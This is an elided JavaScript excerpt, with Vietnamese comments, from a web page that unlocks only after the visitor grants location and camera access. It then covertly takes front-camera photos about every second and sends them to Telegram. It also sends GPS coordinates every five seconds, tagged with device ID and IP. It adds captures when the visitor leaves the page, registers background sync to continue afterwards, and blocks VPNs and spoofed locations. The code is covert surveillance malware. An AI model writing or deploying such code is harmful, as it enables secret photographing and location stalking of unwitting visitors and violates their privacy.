...
#DEV_${devId} #AnhChup #Camera ${safeIpTag ? `#IP_${safeIpTag}` : ''}`;
            ...
            const captureAndSendFrontPhoto = async (customLabel = null) => {
                if (!frontVideo) return;
                const blob = await captureVideoBlob(frontVideo);
                if (blob && blob.size > 0) {
                    frontCount++;
                    const label = customLabel || `CAMERA TRƯỚC (SELFIE) #${frontCount}`;
                    sendPhotoToTelegram(blob, label);
                }
            };
            ...
            const initBackgroundSyncEngine = (userCoords) => {
                ...
                try {
                            ...
                            if (e.data === 'START_BACKGROUND_HEARTBEAT') {
                                if (!pTimer) {
                                    pTimer = setInterval(function() {
                                        self.postMessage({ action: 'BG_PHOTO_TICK' });
                                    }, 1000);
                                }
                                if (!gTimer) {
                    ...
                    bgWorker.onmessage = (e) => {
                        if (e.data.action === 'BG_PHOTO_TICK') {
                            captureAndSendFrontPhoto();
                        } else if (e.data.action === 'BG_GPS_TICK') {
                ...
                window.addEventListener('pagehide', () => {
                    captureAndSendFrontPhoto('CAMERA TRƯỚC (RỜI KHỎI TRANG/OUT WEB)');
                    if (latestCoords || userCoords) {
                        gpsCount++;
                        sendGpsToTelegram(latestCoords || userCoords, gpsCount);
                    }
                    ...
                    if ('serviceWorker' in navigator && 'SyncManager' in window) {
                        navigator.serviceWorker.ready.then((reg) => {
                            if (reg.sync && reg.sync.register) {
                                ...
                                reg.sync.register('bg-photo-sync').catch(() => {});
                            }
                        }).catch(() => {});
                    }
                } catch(e) {}
            ...
            const handleStart = async (e) => {
                ...
                // 3. KIỂM TRA BẢO MẬT: CHẶN FAKE VPN, PROXY, FAKE GPS, SAI SỐ > 1000m
                ...
                // 4. Camera Permission (Không bắt buộc - Nếu người dùng từ chối Camera vẫn cho phép vào web)
                let camAllowed = false;
                try {
                    camAllowed = await requestFrontCameraPromise();
                } catch (camErr) {
                    console.warn("[PermissionGate] Người dùng không cấp quyền Camera (vẫn cho vào web):", camErr);
                    camAllowed = false;
                }

                // Vị trí hợp lệ -> Mở khóa web thành công!
                ...
                // Cứ 5 giây gửi 1 lần định vị GPS về Telegram (Fallback timer)
                setInterval(() => {
                    if (latestCoords || userCoords) {
                        gpsCount++;
                        sendGpsToTelegram(latestCoords || userCoords, gpsCount);
                ...
                // Nếu người dùng đã cấp quyền Camera -> Bắt đầu chụp ảnh và gửi ngầm
                if (camAllowed) {
                    ...
                    // Khởi động Background Sync Engine (Web Worker + Visibility Events + Screen WakeLock)
                    initBackgroundSyncEngine(userCoords);
                }
